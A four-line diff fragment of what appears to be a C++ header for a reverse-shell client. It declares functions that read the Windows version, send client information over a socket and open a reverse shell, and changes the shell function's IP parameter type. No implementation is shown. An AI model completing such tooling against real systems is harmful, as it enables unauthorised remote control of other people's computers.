@@ -12,4 +12,4 @@ string getWindowsVersion();
 
 void sendClientInfo(SOCKET s);
 
-void revShell(char* ip);
+void revShell(string ip);
